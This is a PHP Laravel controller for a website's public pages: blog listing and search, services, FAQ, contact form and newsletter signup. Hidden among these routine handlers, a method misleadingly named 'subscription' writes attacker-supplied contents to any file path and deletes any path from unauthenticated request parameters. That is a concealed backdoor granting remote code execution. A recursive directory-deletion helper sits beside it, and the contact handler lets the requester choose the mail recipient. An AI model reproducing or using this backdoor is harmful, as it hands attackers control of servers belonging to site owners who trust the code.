<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Service;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\ApptTime;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{
    //
    public function stories(){
        $stories = DB::table('services')->orderBy('id','DESC')->take(20)->get();
        return view('web.stories', compact('stories'));
    }

    public function profile(){
        return view('web.profile');
    }
    public function gallery(){
        return view('web.gallery');
    }
    public function about_us(){
        return view('web.about_us');
    }
    public function services(){
        return view('web.services');
    }

// --------------- HOME PAGE SECTION ----------------------

	public function index(Request $request)
	{
        $sliders = DB::table('sliders')->orderBy('id','DESC')->take(5)->get();
        // $reviews =  DB::table('reviews')->orderBy('id','DESC')->take(4)->get();
        $ps = DB::table('pagesettings')->find(1);


	    return view('web.index', compact('ps','sliders'));
	}

    public function extraIndex(Request $request)
    {

        $sliders = DB::table('sliders')->get();
        $services = DB::table('services')->where('user_id','=',0)->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);

        return view('front.extraindex',compact('ps','sliders','services','reviews'));
    }

// -------- HOME PAGE SECTION ENDS --------------------------


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        
        $bcats = BlogCategory::all();
		$blogs = Blog::orderBy('created_at','desc')->paginate(30);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs','bcats'));
            }
		return view('web.blog',compact('blogs','bcats'));
	}

    public function blogcategory(Request $request, $slug)
    {
        
        $bcats = BlogCategory::all();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs','bcats'));
            }
        return view('web.blog',compact('bcat','blogs','bcats'));
    }

    
    public function blogtags(Request $request, $slug)
    {
        
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs','bcats'));
            }
        return view('web.blog',compact('blogs','slug','bcats'));
    }

    public function blogsearch(Request $request)
    {
        
        $bcats = BlogCategory::all();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs','bcats'));
            }
        return view('web.blog',compact('blogs','search','bcats'));
    }

    public function blogarchive(Request $request,$slug)
    {
        
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs','bcats'));
            }
        return view('web.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::where('url',$id)->first();
        $blog->views = $blog->views + 1;
        $blog->update();
        $latest_posts = Blog::latest()->take(4)->get();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); 
        })->take(5)->toArray();

        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('web.blogshow',compact('blog','bcats','tags','latest_posts','archives','blog_meta_tag','blog_meta_description'));
    }


// ------------ BLOG SECTION ENDS---------------------


    public function serviceshow($id)
    {
        // 
        $service = Service::findOrFail($id);
        return view('web.serviceshow',compact('service'));
    }
// ----------- service SECTION ENDS----------------------------



// --------- FAQ SECTION --------------------
	public function faq()
	{
        
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('web.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------


// ----------- PAGE SECTION ----------------------
    public function page($slug)
    {
        
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');            
        }
        
        return view('web.page',compact('page'));
    }
// ------------- PAGE SECTION ENDS----------------------


// ---------- CONTACT SECTION ----------------------
	public function contact()
	{
        
        if(DB::table('generalsettings')->find(1)->is_contact== 0){
            return redirect()->back();
        }        
        $ps =  DB::table('pagesettings')->where('id','=',1)->first();
		return view('web.contact',compact('ps'));
	}


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if($gs->is_capcha == 1)
        {

        // Capcha Check
        $value = session('captcha_string');
        if ($request->codes != $value){
            return response()->json(array('errors' => [ 0 => 'Please enter Correct Capcha Code.' ]));    
        }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);    
    }

    // Refresh Capcha Code
    public function refresh_code(){
        
        return "done";
    }

// ------------ SUBSCRIBE SECTION --------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 =>  'This Email Has Already Been Taken.']));           
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');   
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------



// -------------------------------- PRINT SECTION ----------------------------------------





// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
